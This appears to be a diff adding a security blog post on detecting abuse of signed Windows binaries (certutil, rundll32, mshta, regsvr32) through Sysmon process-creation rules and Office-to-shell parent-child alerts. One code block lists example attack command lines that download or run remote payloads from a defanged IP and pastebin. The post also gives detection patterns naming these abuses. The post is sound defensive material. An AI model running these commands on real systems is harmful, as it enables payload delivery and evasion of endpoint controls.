@@ -1,0 +1,74 @@
+---
+title: "Detecting Living-off-the-Land Binaries in Windows Event Logs"
+description: "certutil, rundll32, mshta — the signed Windows binaries attackers abuse to blend in, and the Sysmon rules that flag them without drowning the SOC in false positives."
+category: "Threat Intel"
+pubDate: 2026-06-18
+readTime: 8
+tags: ["Windows", "Sysmon", "Detection Eng"]
+mitre: ["T1218", "T1059.001", "T1027"]
+cats: ["threatintel", "dfir", "detect"]
+related:
+  - detecting-lateral-movement-active-directory
+  - anatomy-of-a-supply-chain-attack
+faqs:
+  - q: "What is a living-off-the-land binary (LOLBin)?"
+    a: "A LOLBin is a legitimate, signed binary that already ships with Windows — certutil, rundll32, mshta, regsvr32 — that also happens to support downloading, decoding, or executing arbitrary code. Attackers use them instead of dropping custom malware because the binary is trusted, already on the allowlist, and generates no new-file-on-disk alert. The malicious part isn't the binary, it's the argument string."
+  - q: "Why don't antivirus tools catch LOLBin abuse?"
+    a: "Signature-based AV looks for known-bad files. A LOLBin is a known-good, digitally signed Microsoft binary — there's no file to flag. Detection has to shift from 'what ran' to 'what it was told to do,' which means alerting on command-line arguments and parent-child process relationships instead of file hashes."
+  - q: "Which Sysmon event IDs matter most for LOLBin detection?"
+    a: "Event ID 1 (process creation) with full command-line logging enabled is the backbone — it's where the suspicious arguments actually show up. Event ID 3 (network connection) catches the binary reaching out after being told to fetch something, and Event ID 22 (DNS query) catches it before the connection even completes."
+  - q: "What's the single highest-signal LOLBin detection to start with?"
+    a: "certutil.exe with -urlcache or -decode in its command line. There is essentially no legitimate enterprise workflow that looks like that, which makes it one of the rare detections you can ship as a high-confidence, page-someone alert instead of a tuning project."
+---
+
+import Mitre from '../../components/Mitre.astro';
+
+Antivirus is good at catching malware that looks like malware. It's much worse at catching a signed Microsoft binary doing something it was technically designed to do. That gap is where living-off-the-land binaries — LOLBins — live, and it's why a growing share of intrusions never drop a custom executable at all.
+
+## Why LOLBins work
+
+`certutil.exe`, `rundll32.exe`, `mshta.exe`, `regsvr32.exe` — these ship with every Windows install, carry a valid Microsoft signature, and are common enough in normal admin activity that blocking them outright breaks things. Attackers lean on exactly that ambiguity. Using <Mitre id="T1218" /> (signed binary proxy execution), they get a trusted process to download a payload, decode it, or execute it, while every file-hash-based control on the endpoint stays silent — there's no new file to hash, because the "malware" is a command-line argument, not a binary.
+
+## The command lines that give it away
+
+```text
+certutil.exe -urlcache -split -f https://185.220.101[.]47/update.txt payload.exe
+certutil.exe -decode payload.b64 payload.exe
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write()
+mshta.exe https://pastebin[.]com/raw/9f3kD2q1
+regsvr32.exe /s /n /u /i:https://185.220.101[.]47/script.sct scrobj.dll
+```
+
+None of these need a memory-corruption exploit or a zero-day. They need `cmd.exe` or a phishing macro to spawn them, which is why the detection has to live at the process-creation layer, not the file layer.
+
+## Building the Sysmon baseline
+
+Event ID 1 with full command-line logging is the whole game here. A minimal config that surfaces the pattern above:
+
+```xml
+<Sysmon schemaversion="4.90">
+  <EventFiltering>
+    <RuleGroup name="LOLBin abuse" groupRelation="or">
+      <ProcessCreate onmatch="include">
+        <CommandLine condition="contains">certutil -urlcache</CommandLine>
+        <CommandLine condition="contains">certutil -decode</CommandLine>
+        <CommandLine condition="contains">mshta http</CommandLine>
+        <CommandLine condition="contains">regsvr32 /i:http</CommandLine>
+        <Image condition="end with">rundll32.exe</Image>
+      </ProcessCreate>
+    </RuleGroup>
+  </EventFiltering>
+</Sysmon>
+```
+
+That last `rundll32.exe` line is deliberately broader — rundll32 is abused in enough different ways (`javascript:`, `.sct` handlers, exported functions that shell out) that argument-matching alone misses too much. It gets tuned down with an allowlist of known-good DLL exports once the baseline is in and the false-positive rate is measured, not before.
+
+## Parent-child relationships beat command-line matching alone
+
+A command line can be obfuscated — <Mitre id="T1027" /> covers everything from base64 wrapping to character substitution designed to slip past a naive string match. What's much harder to hide is *who spawned the process*. `winword.exe → cmd.exe → certutil.exe` is a lineage that essentially never happens legitimately. Office applications don't shell out to certutil on their own, so alerting on that parent-child chain catches obfuscated variants that a command-line-only rule would miss entirely.
+
+The same logic extends to <Mitre id="T1059.001" />: `outlook.exe → powershell.exe -enc <base64>` is a five-second detection to write and one of the highest-confidence alerts a SOC can ship, because the base64-encoded flag exists almost exclusively to dodge command-line logging — which means its mere presence is closer to a confession than a maybe.
+
+## Where this fits in a detection program
+
+None of this replaces EDR — a mature stack still wants behavioral detection on top. But Sysmon plus a handful of Sigma rules covering the LOLBin list gets a surprising amount of coverage for the cost of one config file and a log pipeline that already exists in most environments. Start with `certutil`, add the parent-child rule for Office-to-shell spawns, and expand from there as the false-positive rate from real admin tooling in the environment becomes clear — every network has a sysadmin script that looks suspicious until it's been triaged once and allowlisted for good.
